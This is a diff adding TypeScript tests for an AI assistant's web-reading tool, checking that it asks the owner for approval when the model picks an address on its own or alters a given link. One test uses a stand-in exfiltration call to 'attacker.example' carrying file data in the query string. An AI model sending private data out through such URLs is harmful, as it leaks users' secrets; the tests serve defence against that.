@@ -106,3 +106,51 @@ describe("the web tools in a conversation", () => {
     expect(logged).not.toContain("SECRET");
   });
 });
+
+describe("reading a page Friend was not pointed at", () => {
+  const seenAsk = () => emitted.some((m) => m.type === "approval.request");
+  const read = (url: string) => [[call("c1", "web.read", { url }), done], [text("ok"), done]];
+
+  it("asks the owner first, showing the whole address, when the model picks an address on its own", async () => {
+    const run = vi.fn(async () => ({ ok: true, text: "page" }));
+    const p = new FakeProvider(read("https://attacker.example/c?d=secret-from-a-file"));
+    await build(p, { enabled: () => true, run }).runTurn("what is on my disk?", ctx());
+    expect(seenAsk()).toBe(true);
+    const card = emitted.find((m) => m.type === "approval.request") as { summary?: string; description?: string } | undefined;
+    expect(JSON.stringify(card)).toContain("attacker.example/c?d=secret-from-a-file");
+    expect(run).not.toHaveBeenCalled(); // nobody said yes
+  });
+
+  it("does not ask for an address the owner typed or said", async () => {
+    const run = vi.fn(async () => ({ ok: true, text: "page" }));
+    const p = new FakeProvider(read("https://news.example.com/story"));
+    await build(p, { enabled: () => true, run }).runTurn("please read https://news.example.com/story for me.", ctx());
+    expect(seenAsk()).toBe(false);
+    expect(run).toHaveBeenCalled();
+  });
+
+  it("does not ask for a link that a search just returned", async () => {
+    const run = vi.fn(async (name: string) => (name === "web.search" ? { ok: true, text: `${UNTRUSTED}\nSearch results for "x" (duckduckgo):\n1. Story - https://news.example.com/story (news.example.com) - a story` } : { ok: true, text: "page" }));
+    const p = new FakeProvider([[call("c1", "web.search", { query: "x" }), done], [call("c2", "web.read", { url: "https://news.example.com/story" }), done], [text("ok"), done]]);
+    await build(p, { enabled: () => true, run }).runTurn("what is the news?", ctx());
+    expect(seenAsk()).toBe(false);
+    expect(run).toHaveBeenCalledWith("web.read", { url: "https://news.example.com/story" }, expect.anything());
+  });
+
+  it("asks again when the model changes a link it was given, for example by adding data to it", async () => {
+    const run = vi.fn(async (name: string) => (name === "web.search" ? { ok: true, text: `${UNTRUSTED}\n1. Story - https://news.example.com/story (news.example.com) - a story` } : { ok: true, text: "page" }));
+    const p = new FakeProvider([[call("c1", "web.search", { query: "x" }), done], [call("c2", "web.read", { url: "https://news.example.com/story?d=private" }), done], [text("ok"), done]]);
+    await build(p, { enabled: () => true, run }).runTurn("what is the news?", ctx());
+    expect(seenAsk()).toBe(true);
+    expect(run).not.toHaveBeenCalledWith("web.read", expect.anything(), expect.anything());
+  });
+
+  it("does not carry a link over from one question to the next", async () => {
+    const run = vi.fn(async () => ({ ok: true, text: "page" }));
+    const p = new FakeProvider([[text("ok"), done], ...read("https://news.example.com/story")]);
+    const agent = build(p, { enabled: () => true, run });
+    await agent.runTurn("see https://news.example.com/story", ctx());
+    await agent.runTurn("read it again", ctx());
+    expect(seenAsk()).toBe(true);
+  });
+});
